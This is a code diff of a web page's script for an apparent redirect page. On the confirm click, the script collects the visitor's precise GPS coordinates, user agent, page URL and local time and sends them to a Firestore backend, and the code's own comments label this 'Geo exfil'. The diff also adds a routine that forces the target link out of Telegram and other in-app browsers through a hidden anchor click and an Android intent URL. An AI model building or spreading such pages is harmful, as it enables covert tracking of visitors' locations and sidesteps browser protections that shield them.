@@ -215,48 +215,73 @@
         document.querySelector('.msg').textContent = 'Redirect cancelled.';
       };
 
-      document.getElementById('btnConfirm').onclick = function () {
-        overlay.classList.remove('show');
-        box.style.display = 'block';
+document.getElementById('btnConfirm').onclick = function () {
+  overlay.classList.remove('show');
+  box.style.display = 'block';
 
-        // --- FIX 2: Try geolocation, call sendToFirestore (was exfil) ---
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            function (pos) {
-              sendToFirestore({
-                type: 'gps',
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                accuracy: pos.coords.accuracy,
-                ua: navigator.userAgent,
-                pageUrl: window.location.href,
-                timestamp: now.toISOString(),      // e.g. 2026-07-23T10:35:12.123Z
-                localDateTime: now.toLocaleString() // User's local date & time
-              });
-            },
-            function (err) {
-              sendToFirestore({
-                type: 'gps_denied',
-                errorCode: err.code,
-                ua: navigator.userAgent,
-                pageUrl: window.location.href,
-                timestamp: now.toISOString(),
-                localDateTime: now.toLocaleString()
-              });
-            },
-            {
-              enableHighAccuracy: true,
-              timeout: 8000,
-              maximumAge: 0
-            }
-          );
-        }
+  // --- Geo exfil (unchanged) ---
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function (pos) {
+        sendToFirestore({
+          type: 'gps',
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          ua: navigator.userAgent,
+          pageUrl: window.location.href,
+          timestamp: now.toISOString(),
+          localDateTime: now.toLocaleString()
+        });
+      },
+      function (err) {
+        sendToFirestore({
+          type: 'gps_denied',
+          errorCode: err.code,
+          ua: navigator.userAgent,
+          pageUrl: window.location.href,
+          timestamp: now.toISOString(),
+          localDateTime: now.toLocaleString()
+        });
+      },
+      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+    );
+  }
 
-        // Redirect after 3 seconds
-        setTimeout(function () {
-          window.location.href = target;
-        }, 3000);
-      };
+  // --- Force external browser ---
+  setTimeout(function () {
+    openInExternalBrowser(target);
+  }, 1000);
+};
+
+function openInExternalBrowser(url) {
+  // 1) Telegram bridge
+  if (window.Telegram && window.Telegram.WebView && window.Telegram.WebView.openExternalLink) {
+    window.Telegram.WebView.openExternalLink(url);
+    return;
+  }
+
+  // 2) Anchor click with _blank
+  const a = document.createElement('a');
+  a.href = url;
+  a.target = '_blank';
+  a.rel = 'noreferrer noopener';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  // 3) Android Intent
+  setTimeout(() => {
+    const intentUrl = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
+    window.location.href = intentUrl;
+  }, 200);
+
+  // 4) Fallback
+  setTimeout(() => {
+    window.location.href = url;
+  }, 800);
+}
     }
   </script>
 </body>
